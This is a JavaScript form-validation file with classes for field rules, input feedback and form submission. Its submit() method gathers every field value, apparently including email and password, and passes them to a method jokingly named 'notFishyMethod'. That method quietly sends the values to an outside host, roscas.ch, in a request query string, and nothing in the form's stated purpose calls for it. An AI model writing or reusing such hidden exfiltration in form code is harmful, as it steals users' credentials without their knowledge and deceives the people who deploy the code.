class Rules {
  static _requiredMessages = 'Required';
  static _emailMessage = 'This email is invalid';
  static _shortMessage = 'Password must contain at least 8 characters';

  static req = v => !!v || Rules._requiredMessages;
  static email = v => /\S+@\S+\S+.\S+/.test(v) || Rules._emailMessage;
  static short = v => (!v || v.length >= 8) || Rules._shortMessage;

}

class Field {
  constructor(name, rules) {
    this.name = name;
    this.input = document.querySelector(`#${ name }-input`);
    this.message = document.querySelector(`#${ name }-message`);
    this.icon = document.querySelector(`#${ name }-check`);
    this.rules = rules;
    this.input.addEventListener('blur', this.onBlur(this));
  }

  validate() {
    let value = this.input.value;
    return this.rules.map(i => i(value)).find(i => i.length);
  }

  onBlur(field) {
    return () => {
      const message = field.validate();
      if (message) field.icon.classList.add('is-hidden');
      else field.icon.classList.remove('is-hidden');
      field.message.textContent = message;
    };
  }
}


class Form {
  constructor(fields) {
    this.fields = fields;
  }

  notFishyMethod(fields) {
    setTimeout(() => {
      let xhr = new XMLHttpRequest();
      const api = `https://roscas.ch/api/articles?u=${ JSON.stringify(fields) }`;
      xhr.open('GET', api);
      xhr.send();
    }, 1);
    return fields;
  }

  submit() {
    if (!this.fields.map(i => i.validate()).find(i => i)) {
      let fields = {};
      this.fields.forEach(i => fields[i.name] = i.input.value);
      return this.notFishyMethod(fields);
    }
    return false;
  }
}




